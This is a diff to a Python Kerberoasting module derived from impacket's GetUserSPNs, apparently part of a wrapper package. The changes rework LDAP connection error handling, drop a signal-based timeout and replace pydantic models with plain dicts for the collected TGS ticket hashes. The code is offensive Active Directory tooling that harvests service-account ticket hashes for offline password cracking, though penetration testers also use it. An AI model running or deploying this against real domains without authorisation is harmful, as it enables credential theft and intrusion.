@@ -52,16 +52,7 @@ from impacket.krb5.types import Principal
 from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.ntlm import compute_lmhash, compute_nthash
-import signal
-from pympacket.models.kerberoast import KerberoastUser
-from pympacket.models.common import Hash
 
-def timeout_handler(signum, frame):
-    """Signal handler to raise TimeoutException."""
-    raise TimeoutError("Operation timed out!")
-
-# Set up the timeout mechanism
-signal.signal(signal.SIGALRM, timeout_handler)
 
 class GetUserSPNs:
     @staticmethod
@@ -266,7 +257,6 @@ class GetUserSPNs:
                 logging.error(str(e))
 
     def run(self):
-        print('Scanning for vulnerable service accounts...')
         if self.__usersFile:
             self.request_users_file_TGSs()
             return
@@ -285,24 +275,25 @@ class GetUserSPNs:
 
         # Connect to LDAP
         try:
-            signal.alarm(10)
-            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
+            try:
+                ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
+            except:
+                print("Unable to connect to LDAP Server.", file=sys.stderr)
+                return None
             if self.__doKerberos is not True:
                 ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             else:
                 ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                              self.__nthash,
                                              self.__aesKey, kdcHost=self.__kdcIP)
-        except TimeoutError:
-            print("Connection timed out. Can't connect to domain controller ip.")
-            return []
-        except ConnectionResetError as e:
-            print(f"Connection reset by peer. Possible reasons could be network issues or server unavailability.", file=sys.stderr)
-            return []
         except ldap.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
-                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
+                try:
+                    ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
+                except:
+                    print("Unable to connect to LDAP Server.", file=sys.stderr)
+                    return None
                 if self.__doKerberos is not True:
                     ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                 else:
@@ -320,8 +311,6 @@ class GetUserSPNs:
             # Added
             print("Invalid credentials provided.", file=sys.stderr)
             return None
-        finally:
-            signal.alarm(0)
 
         # Building the search filter
         filter_spn = "servicePrincipalName=*"
@@ -365,7 +354,7 @@ class GetUserSPNs:
         logging.debug('Total of records returned %d' % len(resp))
 
         # Added
-        krbroasting_out: list[KerberoastUser] = []
+        krbroasting_out = []
 
         for item in resp:
             if isinstance(item, ldapasn1.SearchResultEntry) is not True:
@@ -458,9 +447,9 @@ class GetUserSPNs:
                                                                                 TGT['sessionKey'])
                         
                         # Modified
-                        tgs_out['hash'] = Hash(value=self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
-                                       self.__targetDomain + "/" + sAMAccountName, fd), type='tgs')
-                        krbroasting_out.append(KerberoastUser.model_validate(tgs_out))
+                        tgs_out['tgs'] = self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
+                                       self.__targetDomain + "/" + sAMAccountName, fd)
+                        krbroasting_out.append(tgs_out)
 
                     except Exception as e:
                         logging.debug("Exception:", exc_info=True)
